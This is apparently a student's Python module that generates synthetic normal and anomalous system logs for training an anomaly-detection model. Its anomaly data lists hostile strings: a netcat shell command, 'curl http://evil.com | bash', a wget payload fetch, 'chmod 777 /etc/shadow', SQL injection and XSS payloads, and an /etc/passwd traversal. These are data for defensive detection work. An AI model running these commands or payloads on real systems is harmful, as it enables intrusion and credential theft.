"""
Data Generator untuk Deteksi Anomali Log Sistem

Module ini menghasilkan data log sintetis untuk training dan testing
model deteksi anomali. Data yang dihasilkan mencakup log normal dan
log anomali dengan berbagai jenis serangan/kesalahan.

Author: Mahasiswa AI
Date: 2026-01-04
"""

import os
import random
import argparse
from datetime import datetime, timedelta
from typing import List, Tuple, Dict
import pandas as pd
import numpy as np
from tqdm import tqdm


class SystemLogGenerator:
    """
    Generator untuk membuat data log sistem sintetis.
    
    Attributes:
        seed (int): Random seed untuk reproducibility
        anomaly_ratio (float): Rasio anomali terhadap total log
    """
    
    def __init__(self, seed: int = 42, anomaly_ratio: float = 0.1):
        """
        Inisialisasi generator.
        
        Args:
            seed: Random seed
            anomaly_ratio: Rasio log anomali (0.0 - 1.0)
        """
        self.seed = seed
        self.anomaly_ratio = anomaly_ratio
        random.seed(seed)
        np.random.seed(seed)
        
        # Template log normal
        self.normal_templates = [
            # SSH logs
            "Accepted password for {user} from {ip} port {port} ssh2",
            "session opened for user {user} by (uid=0)",
            "session closed for user {user}",
            "Received disconnect from {ip} port {port}:11: disconnected by user",
            
            # System logs
            "systemd[1]: Started {service}.service",
            "systemd[1]: Stopped {service}.service",
            "systemd[1]: Starting {service}.service...",
            "kernel: [{timestamp}] {device}: link up",
            "kernel: [{timestamp}] {device}: link down",
            
            # Apache/Nginx logs
            "{ip} - - [{datetime}] \"GET {path} HTTP/1.1\" 200 {bytes}",
            "{ip} - - [{datetime}] \"POST {path} HTTP/1.1\" 200 {bytes}",
            "{ip} - - [{datetime}] \"GET {path} HTTP/1.1\" 304 0",
            
            # Database logs
            "MySQL server started with process id {pid}",
            "PostgreSQL database system is ready to accept connections",
            "Connection received: host={ip} user={user} database={db}",
            
            # Application logs
            "[INFO] Application started successfully",
            "[INFO] Request processed in {time}ms",
            "[INFO] Cache hit for key: {key}",
            "[DEBUG] Processing request from {ip}",
            "[INFO] User {user} logged in successfully",
        ]
        
        # Template log anomali
        self.anomaly_templates = {
            "brute_force": [
                "Failed password for {user} from {ip} port {port} ssh2",
                "Failed password for invalid user {user} from {ip} port {port} ssh2",
                "authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}",
                "PAM: Authentication failure for {user} from {ip}",
                "error: maximum authentication attempts exceeded for {user} from {ip}",
            ],
            "privilege_escalation": [
                "{user}: user NOT in sudoers; TTY=pts/0; PWD=/home/{user}; USER=root; COMMAND=/bin/bash",
                "sudo: {user} : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND={cmd}",
                "su: FAILED SU (to root) {user} on pts/0",
                "ALERT: Unauthorized privilege escalation attempt by {user}",
            ],
            "suspicious_network": [
                "{ip} - - [{datetime}] \"GET /admin HTTP/1.1\" 403 {bytes}",
                "{ip} - - [{datetime}] \"POST /login HTTP/1.1\" 401 {bytes}",
                "Possible SQL injection attack from {ip}: {payload}",
                "Blocked suspicious request from {ip}: {path}",
                "DDoS attack detected from {ip} - rate limit exceeded",
                "{ip} - - [{datetime}] \"GET /../../../etc/passwd HTTP/1.1\" 400 {bytes}",
            ],
            "system_error": [
                "kernel: Out of memory: Kill process {pid} ({process}) score {score}",
                "kernel: BUG: soft lockup - CPU#{cpu} stuck for {time}s!",
                "[ERROR] Disk space critical: {mount} at {percent}% usage",
                "systemd[1]: {service}.service failed",
                "kernel: [{timestamp}] I/O error, dev {device}, sector {sector}",
                "[CRITICAL] Database connection pool exhausted",
                "[ERROR] Memory allocation failed for request from {ip}",
            ],
            "malware_indicator": [
                "ALERT: Suspicious process detected: {process} (PID: {pid})",
                "WARNING: Unauthorized file modification: {path}",
                "ALERT: Reverse shell connection attempt to {ip}:{port}",
                "WARNING: Cryptominer activity detected on process {pid}",
                "ALERT: Rootkit signature detected in {path}",
            ],
        }
        
        # Data untuk placeholder
        self.users = ["admin", "root", "user", "guest", "mysql", "postgres", "www-data", "nginx", "apache"]
        self.services = ["nginx", "apache2", "mysql", "postgresql", "redis", "mongodb", "docker", "ssh", "cron"]
        self.devices = ["eth0", "eth1", "wlan0", "docker0", "br-0"]
        self.paths = ["/", "/index.html", "/api/v1/users", "/api/v1/data", "/static/js/app.js", 
                      "/images/logo.png", "/css/style.css", "/admin", "/login", "/dashboard"]
        self.databases = ["production", "staging", "test", "analytics", "users"]
        self.sql_payloads = ["' OR '1'='1", "'; DROP TABLE users;--", "UNION SELECT * FROM users", 
                             "1; EXEC xp_cmdshell", "<script>alert('xss')</script>"]
        self.malicious_processes = ["cryptominer", "reverse_shell", "keylogger", "botnet_client", "ransomware"]
        self.suspicious_commands = ["/bin/nc -e /bin/bash", "wget http://malware.com/payload", 
                                    "curl http://evil.com | bash", "chmod 777 /etc/shadow"]
        
    def _generate_ip(self, is_suspicious: bool = False) -> str:
        """Generate alamat IP."""
        if is_suspicious:
            # IP yang sering diasosiasikan dengan serangan
            suspicious_ranges = ["185.220.", "45.33.", "192.42.", "104.248."]
            return random.choice(suspicious_ranges) + str(random.randint(1, 254)) + "." + str(random.randint(1, 254))
        return f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
    
    def _generate_timestamp(self, base_time: datetime = None) -> str:
        """Generate timestamp."""
        if base_time is None:
            base_time = datetime.now()
        offset = timedelta(seconds=random.randint(0, 86400))
        timestamp = base_time - offset
        return timestamp.strftime("%Y-%m-%d %H:%M:%S")
    
    def _generate_datetime_apache(self, base_time: datetime = None) -> str:
        """Generate datetime format Apache."""
        if base_time is None:
            base_time = datetime.now()
        offset = timedelta(seconds=random.randint(0, 86400))
        timestamp = base_time - offset
        return timestamp.strftime("%d/%b/%Y:%H:%M:%S +0700")
    
    def _fill_template(self, template: str, is_anomaly: bool = False) -> str:
        """Isi placeholder dalam template."""
        replacements = {
            "{user}": random.choice(self.users),
            "{ip}": self._generate_ip(is_suspicious=is_anomaly),
            "{port}": str(random.randint(1024, 65535)),
            "{service}": random.choice(self.services),
            "{device}": random.choice(self.devices),
            "{path}": random.choice(self.paths),
            "{bytes}": str(random.randint(100, 50000)),
            "{pid}": str(random.randint(1000, 65535)),
            "{db}": random.choice(self.databases),
            "{time}": str(random.randint(1, 5000)),
            "{key}": f"cache_key_{random.randint(1, 1000)}",
            "{timestamp}": f"{random.randint(1, 999)}.{random.randint(100000, 999999)}",
            "{datetime}": self._generate_datetime_apache(),
            "{cpu}": str(random.randint(0, 7)),
            "{percent}": str(random.randint(90, 99)),
            "{mount}": random.choice(["/", "/home", "/var", "/tmp"]),
            "{sector}": str(random.randint(1000000, 9999999)),
            "{score}": str(random.randint(100, 999)),
            "{process}": random.choice(self.malicious_processes) if is_anomaly else random.choice(["python", "java", "node"]),
            "{payload}": random.choice(self.sql_payloads),
            "{cmd}": random.choice(self.suspicious_commands),
        }
        
        result = template
        for placeholder, value in replacements.items():
            result = result.replace(placeholder, value)
        
        return result
    
    def generate_normal_log(self) -> str:
        """Generate satu log normal."""
        template = random.choice(self.normal_templates)
        return self._fill_template(template, is_anomaly=False)
    
    def generate_anomaly_log(self, anomaly_type: str = None) -> Tuple[str, str]:
        """
        Generate satu log anomali.
        
        Args:
            anomaly_type: Jenis anomali (opsional, jika None akan random)
            
        Returns:
            Tuple berisi (log_message, anomaly_type)
        """
        if anomaly_type is None:
            anomaly_type = random.choice(list(self.anomaly_templates.keys()))
        
        templates = self.anomaly_templates[anomaly_type]
        template = random.choice(templates)
        
        return self._fill_template(template, is_anomaly=True), anomaly_type
    
    def generate_logs(self, num_logs: int, include_labels: bool = True) -> pd.DataFrame:
        """
        Generate dataset log.
        
        Args:
            num_logs: Jumlah total log yang akan digenerate
            include_labels: Apakah menyertakan label (untuk supervised learning)
            
        Returns:
            DataFrame dengan kolom: timestamp, log_message, label, anomaly_type
        """
        logs = []
        num_anomalies = int(num_logs * self.anomaly_ratio)
        num_normal = num_logs - num_anomalies
        
        base_time = datetime.now()
        
        print(f"Generating {num_normal} normal logs...")
        for _ in tqdm(range(num_normal)):
            timestamp = self._generate_timestamp(base_time)
            log_message = self.generate_normal_log()
            logs.append({
                "timestamp": timestamp,
                "log_message": log_message,
                "label": 0,  # Normal
                "anomaly_type": "normal"
            })
        
        print(f"Generating {num_anomalies} anomaly logs...")
        for _ in tqdm(range(num_anomalies)):
            timestamp = self._generate_timestamp(base_time)
            log_message, anomaly_type = self.generate_anomaly_log()
            logs.append({
                "timestamp": timestamp,
                "log_message": log_message,
                "label": 1,  # Anomali
                "anomaly_type": anomaly_type
            })
        
        # Shuffle logs
        random.shuffle(logs)
        
        df = pd.DataFrame(logs)
        
        # Sort by timestamp
        df = df.sort_values("timestamp").reset_index(drop=True)
        
        if not include_labels:
            df = df.drop(columns=["label", "anomaly_type"])
        
        return df
    
    def generate_sequence_data(self, num_sequences: int, sequence_length: int) -> pd.DataFrame:
        """
        Generate data dalam format sequence untuk training.
        
        Args:
            num_sequences: Jumlah sequence
            sequence_length: Panjang setiap sequence
            
        Returns:
            DataFrame dengan sequence log
        """
        sequences = []
        
        for i in tqdm(range(num_sequences), desc="Generating sequences"):
            # Tentukan apakah sequence ini mengandung anomali
            has_anomaly = random.random() < self.anomaly_ratio
            
            sequence_logs = []
            anomaly_positions = []
            
            if has_anomaly:
                # Random jumlah anomali dalam sequence (1-3)
                num_anomalies_in_seq = random.randint(1, min(3, sequence_length))
                anomaly_positions = random.sample(range(sequence_length), num_anomalies_in_seq)
            
            for j in range(sequence_length):
                if j in anomaly_positions:
                    log, anomaly_type = self.generate_anomaly_log()
                    sequence_logs.append(log)
                else:
                    sequence_logs.append(self.generate_normal_log())
            
            sequences.append({
                "sequence_id": i,
                "logs": " [SEP] ".join(sequence_logs),
                "label": 1 if has_anomaly else 0,
                "num_anomalies": len(anomaly_positions)
            })
        
        return pd.DataFrame(sequences)


def generate_sample_logs(output_path: str = "data/raw/sample_logs.txt", num_logs: int = 100):
    """
    Generate contoh log untuk demonstrasi.
    
    Args:
        output_path: Path file output
        num_logs: Jumlah log
    """
    generator = SystemLogGenerator(seed=42, anomaly_ratio=0.2)
    df = generator.generate_logs(num_logs, include_labels=False)
    
    # Simpan sebagai text file
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    
    with open(output_path, "w") as f:
        for _, row in df.iterrows():
            f.write(f"{row['timestamp']} {row['log_message']}\n")
    
    print(f"Sample logs saved to {output_path}")


def main():
    """Main function untuk CLI."""
    parser = argparse.ArgumentParser(description="Generate synthetic system logs")
    parser.add_argument("--num_logs", type=int, default=10000, help="Number of logs to generate")
    parser.add_argument("--anomaly_ratio", type=float, default=0.1, help="Ratio of anomaly logs (0.0-1.0)")
    parser.add_argument("--output", type=str, default="data/raw/", help="Output directory")
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    parser.add_argument("--format", type=str, choices=["csv", "txt", "both"], default="both", help="Output format")
    
    args = parser.parse_args()
    
    # Buat direktori output
    os.makedirs(args.output, exist_ok=True)
    
    # Generate logs
    generator = SystemLogGenerator(seed=args.seed, anomaly_ratio=args.anomaly_ratio)
    df = generator.generate_logs(args.num_logs)
    
    # Simpan hasil
    if args.format in ["csv", "both"]:
        csv_path = os.path.join(args.output, "system_logs.csv")
        df.to_csv(csv_path, index=False)
        print(f"CSV saved to {csv_path}")
    
    if args.format in ["txt", "both"]:
        txt_path = os.path.join(args.output, "system_logs.txt")
        with open(txt_path, "w") as f:
            for _, row in df.iterrows():
                f.write(f"{row['timestamp']} [{row['anomaly_type'].upper()}] {row['log_message']}\n")
        print(f"TXT saved to {txt_path}")
    
    # Print statistik
    print("\n" + "="*50)
    print("STATISTIK DATASET")
    print("="*50)
    print(f"Total logs: {len(df)}")
    print(f"Normal logs: {len(df[df['label'] == 0])} ({len(df[df['label'] == 0])/len(df)*100:.1f}%)")
    print(f"Anomaly logs: {len(df[df['label'] == 1])} ({len(df[df['label'] == 1])/len(df)*100:.1f}%)")
    print("\nDistribusi Jenis Anomali:")
    anomaly_dist = df[df['label'] == 1]['anomaly_type'].value_counts()
    for anomaly_type, count in anomaly_dist.items():
        print(f"  - {anomaly_type}: {count}")


if __name__ == "__main__":
    main()
